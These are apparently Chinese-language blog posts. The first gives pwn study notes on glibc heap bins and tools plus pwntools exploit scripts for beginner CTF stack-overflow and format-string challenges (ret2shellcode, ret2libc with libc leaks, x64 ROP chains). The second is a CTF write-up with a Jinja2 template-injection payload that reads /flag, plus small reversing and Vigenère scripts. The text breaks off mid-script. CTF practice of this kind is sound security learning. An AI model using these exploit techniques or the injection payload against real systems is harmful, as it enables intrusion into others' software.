<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a><strong>bin</strong></h3><p>分配方式：<code>fastbin</code> —&gt;<code>unsorted bin</code>—&gt;<code>small bin</code>/<code>large bin</code> </p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png" alt="image-20201119162311702"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png" alt="image-20201119115539452"></p>
<h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><h4 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a><strong>fastbins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png" alt="image-20201119162151833"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png" alt="image-20201119163702351"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png" alt="image-20201119120748019"></p>
<p><strong>bin的双向链表</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a><strong>unsorted bin</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png" alt="image-20201119163039733"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png" alt="image-20201119163232880"></p>
<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a><strong>small bins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png" alt="image-20201119163209378"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png" alt="image-20201119163319068"></p>
<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png" alt="image-20201119163433718"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png" alt="image-20201119163457182"></p>
<p><strong>实例</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png" alt="image-20201119115142092"></p>
<h1 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png" alt="image-20201119163935171"></p>
<h1 id="工具学习"><a href="#工具学习" class="headerlink" title="工具学习"></a>工具学习</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Import pwntools</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#Local communication</span></span><br><span class="line">io = process(<span class="string">"./a.out"</span>)</span><br><span class="line"><span class="comment">#Telecommunication</span></span><br><span class="line">io = remote(<span class="string">"ip"</span>,port)</span><br><span class="line"><span class="comment">#Receive message</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvuntil(<span class="string">b":"</span>)</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>,drop = <span class="literal">True</span>)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#Send message</span></span><br><span class="line">io.sendline(<span class="string">b"abc"</span>)</span><br><span class="line">io.send(p32(<span class="number">0</span>)+<span class="string">b"\x0a"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str)</span><br><span class="line"><span class="comment">#Interactive</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">shellcraft.sh()  <span class="comment">#in sh environment</span></span><br><span class="line">shellcraft.amd64.sh() <span class="comment">#64 bit</span></span><br><span class="line">asm(shellcraft.sh()) <span class="comment">#machine code</span></span><br><span class="line">asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>) <span class="comment">#if the length is less than 112,then it will be supplemented whith a. </span></span><br><span class="line"><span class="comment">#if you want to attack the 64 bit,pls add it</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#find strings</span></span><br><span class="line">elf = ELF(<span class="string">"./filename"</span>)</span><br><span class="line">hex(next(elf.search(<span class="string">b"/bin/sh"</span>)))</span><br><span class="line"><span class="comment">#elf file</span></span><br><span class="line">elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">hex(elf.got[<span class="string">"puts"</span>])</span><br><span class="line">hex(elf.plt[<span class="string">"system"</span>])</span><br><span class="line">hex(elf.symbols[<span class="string">"buf2"</span>])</span><br><span class="line"><span class="comment">#flat</span></span><br><span class="line">flat([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#generate data</span></span><br><span class="line">cyclic(<span class="number">60</span>)</span><br><span class="line"><span class="comment">#byte data</span></span><br><span class="line">p32(<span class="number">1234</span>)</span><br><span class="line">\xd2\x04\x00\x00</span><br><span class="line">u32(<span class="string">"\xd2\x04\x00\x00"</span>)</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#start</span></span><br><span class="line">gdb file</span><br><span class="line">start</span><br><span class="line"><span class="comment">#run the executable</span></span><br><span class="line">run</span><br><span class="line"><span class="comment">#backtrace</span></span><br><span class="line">backtrace</span><br><span class="line"><span class="comment">#return</span></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"><span class="comment">#breakpoint</span></span><br><span class="line">b main</span><br><span class="line">b <span class="keyword">function</span></span><br><span class="line">b *0x</span><br><span class="line"><span class="comment">#information for breakpoint</span></span><br><span class="line">info b</span><br><span class="line"><span class="comment">#delete the breakpoint</span></span><br><span class="line">d num</span><br><span class="line"><span class="comment">#run</span></span><br><span class="line">r </span><br><span class="line"><span class="comment">#next step over</span></span><br><span class="line">n </span><br><span class="line"><span class="comment">#step in </span></span><br><span class="line">s  </span><br><span class="line"><span class="comment">#stack</span></span><br><span class="line">stack size</span><br><span class="line">stack 24</span><br><span class="line"><span class="comment">#virtual memory map</span></span><br><span class="line"><span class="comment">#to look rwx segment</span></span><br><span class="line">vmmap</span><br><span class="line"><span class="comment">#plt</span></span><br><span class="line">plt</span><br><span class="line">x p</span><br><span class="line">x/20 p</span><br><span class="line"><span class="comment">#got</span></span><br><span class="line">got</span><br><span class="line"><span class="comment">#chunk</span></span><br><span class="line">fastbin</span><br><span class="line">heap</span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">b *<span class="variable">$rebase</span>(0x18540)</span><br></pre></td></tr></table></figure>
<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G  直接跳转地址</span><br><span class="line">shift+f12  打开字符串窗口</span><br><span class="line">shift+E  提取字符串</span><br><span class="line">n  重命名变量</span><br></pre></td></tr></table></figure>
<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary filename --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libcbase + one_gadget_address</span><br></pre></td></tr></table></figure>
<h1 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h1><p>非常简单，适合入门</p>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="ret2text-1"><a href="#ret2text-1" class="headerlink" title="ret2text"></a>ret2text</h3><p>直接有后门函数，所以我们只需要把垃圾数据填满覆盖ebp，然后让返回地址返回后门函数的地址就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2text"</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">20</span> + p32(<span class="number">0x8048522</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2shellcode-1"><a href="#ret2shellcode-1" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>自己写入shellcode(bss)，然后溢出地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>)</span><br><span class="line">payload = shellcode + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ROPgadget</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x80bb196</span></span><br><span class="line">pop_edx = <span class="number">0x806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">payload =flat([ <span class="string">b'A'</span>* <span class="number">112</span> , pop_eax , <span class="number">0xb</span> ,pop_edx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x80be408</span> ,int_80])</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png" alt="image-20201107232027030"></p>
<p>栈溢出，有/bin/sh字符串 system@plt 构造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">io = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">bin_sh = next(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(system_plt) + <span class="string">b'BBBB'</span> + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p>栈溢出 无/bin/sh字符串，但bss段可写</p>
<p>第一种</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png" alt="image-20201112215451308"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>第二种</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png" alt="image-20201113183137009"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x804843d</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/bash\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="retlibc3"><a href="#retlibc3" class="headerlink" title="retlibc3"></a>retlibc3</h3><p>栈变量的结构</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png" alt="image-20201113202023659"></p>
<p>栈的结构</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png" alt="image-20201113202640601"></p>
<p>泄露libc</p>
<p>应该是libc不同导致打不通</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(put))</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">libcbase = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - puts</span><br><span class="line">payload = flat( cyclic(<span class="number">60</span>), libcbase + system , <span class="number">0xdeadbeef</span> ,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn2-x64"><a href="#pwn2-x64" class="headerlink" title="pwn2_x64"></a>pwn2_x64</h3><p>栈图</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png" alt="image-20201116200344612"></p>
<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><ol>
<li>通过libc泄露系统函数，首先获得基地址可以通过以下来泄露（1）通过ROP系统调用（2）直接函数write泄露</li>
<li>无sh （1）符号有无sh  （2）通过ROP将/bin/sh写入 （3）libc中/bin/sh</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./level3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">vulfun_addr = <span class="number">0x0804844B</span>  </span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b"Input:\n"</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>)) <span class="comment">#Specify four bytes</span></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">sh_addr = libc_base + next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="comment">#libc_write=libc.symbols['write']</span></span><br><span class="line"><span class="comment">#libc_system=libc.symbols['system']</span></span><br><span class="line"><span class="comment">#libc_sh=next(libc.search(b'/bin/sh'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr=write_addr-libc_write+libc_system </span></span><br><span class="line"><span class="comment">#sh_addr=write_addr-libc_write+libc_sh</span></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">b'A'</span>*<span class="number">4</span> + p32(sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn3-x64"><a href="#pwn3-x64" class="headerlink" title="pwn3_x64"></a>pwn3_x64</h3><p>两次ROP</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png" alt="image-20201117174620932"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png" alt="image-20201117174719721"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#context.log_level="debug" </span></span><br><span class="line">elf=ELF(<span class="string">"level3_x64"</span>) </span><br><span class="line">write_plt=elf.symbols[<span class="string">"write"</span>] </span><br><span class="line">write_got=elf.got[<span class="string">"write"</span>] </span><br><span class="line">vul_addr=elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">p = process(<span class="string">"./level3_x64"</span>)</span><br><span class="line"><span class="comment">#p=remote("47.116.107.8",9883) </span></span><br><span class="line">p.recvuntil(<span class="string">b"Input:\n"</span>) </span><br><span class="line">pop_rdi_addr=<span class="number">0x00000000004006b3</span>   <span class="comment">#0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x00000000004006b1</span>      <span class="comment">#0x00000000004006b1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">payload1 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_addr) + p64(write_got) + p64(<span class="string">'deadbeef'</span>) + p64(write_plt) + p64(vul_addr) </span><br><span class="line">p.sendline(payload1) </span><br><span class="line">t=p.recv(<span class="number">8</span>)</span><br><span class="line">write_addr=u64(t[<span class="number">0</span>:<span class="number">8</span>]) </span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">offset=write_addr-libc.symbols[<span class="string">"write"</span>] </span><br><span class="line">sys_addr=offset+libc.symbols[<span class="string">"system"</span>] </span><br><span class="line">bin_addr=offset+next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload2 = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fmtstr1"><a href="#fmtstr1" class="headerlink" title="fmtstr1"></a>fmtstr1</h3><p>还是比较简单的</p>
<p>思路：将x的地址放到栈上，对应的获取栈上的地址相对于<code>printf</code>的第几个参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">conn=process(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">e=ELF(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">x_addr=<span class="number">0x0804A02C</span>                                      </span><br><span class="line">payload=p32(x_addr) + <span class="string">b"%11$n"</span></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fmstr2"><a href="#fmstr2" class="headerlink" title="fmstr2"></a>fmstr2</h3><p>这题很奇怪 X64  感觉是爆破出来的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%9$s</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>CUMT2020华为杯</title>
    <url>/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="CUMT华为杯"><a href="#CUMT华为杯" class="headerlink" title="CUMT华为杯"></a>CUMT华为杯</h1><p>web狗活成了各方向签到手…</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p>模板注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h2><p>f12摇奖得flag</p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello_world"></a>hello_world</h2><p>异或</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d=[]</span><br><span class="line">b = <span class="string">"is_easy_right?"</span></span><br><span class="line">a = [<span class="string">'2A'</span>, <span class="string">'26'</span>, <span class="string">'12'</span>, <span class="string">'31'</span>, <span class="string">'1A'</span>, <span class="string">'7'</span>, <span class="string">'11'</span>, <span class="string">'3A'</span>, <span class="string">'2D'</span>, <span class="string">'0F'</span>, <span class="string">'0E'</span>,<span class="string">'1A'</span>, <span class="string">'41'</span>, <span class="string">'4B'</span>, <span class="string">'36'</span>, <span class="string">'43'</span>, <span class="string">'31'</span>, <span class="string">'0'</span>, <span class="string">'3E'</span>, <span class="string">'16'</span>, <span class="string">'17'</span>, <span class="string">'35'</span>,<span class="string">'1D'</span>, <span class="string">'10'</span>, <span class="string">'38'</span>, <span class="string">'11'</span>, <span class="string">'44'</span>, <span class="string">'4A'</span>, <span class="string">'1B'</span>, <span class="string">'2C'</span>, <span class="string">'2B'</span>, <span class="string">'17'</span>,<span class="string">'50'</span>,<span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    z = x</span><br><span class="line">    c += <span class="string">'0x'</span></span><br><span class="line">    c +=z</span><br><span class="line">    d.append(c)</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">35</span>):</span><br><span class="line">    c = int(a[i],<span class="number">16</span>)</span><br><span class="line">    m = i%<span class="number">14</span></span><br><span class="line">    print(chr(ord((b[m]))^c),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<h2 id="non-name"><a href="#non-name" class="headerlink" title="non_name"></a>non_name</h2><p>四元一次方程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = [<span class="number">12</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">12</span>, <span class="number">53</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">34</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">43</span>]</span><br><span class="line">c = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    sum1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        print(<span class="string">"%s*%s"</span>%(b[i*<span class="number">4</span>+j],c[j]),end=<span class="string">'+'</span>)</span><br><span class="line">    print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#116 103 102 114</span></span><br></pre></td></tr></table></figure>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classical"><a href="#Classical" class="headerlink" title="Classical"></a>Classical</h2><p>维吉尼亚密码，上网down脚本，猜密钥，跑出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikz’wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izr’m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csg’v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn."</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line"></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> message[i].islower():</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'a'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'A'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += message[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    explain = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cipher[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> cipher[i].islower():</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'a'</span>) - offset) % <span class="number">26</span> + ord(<span 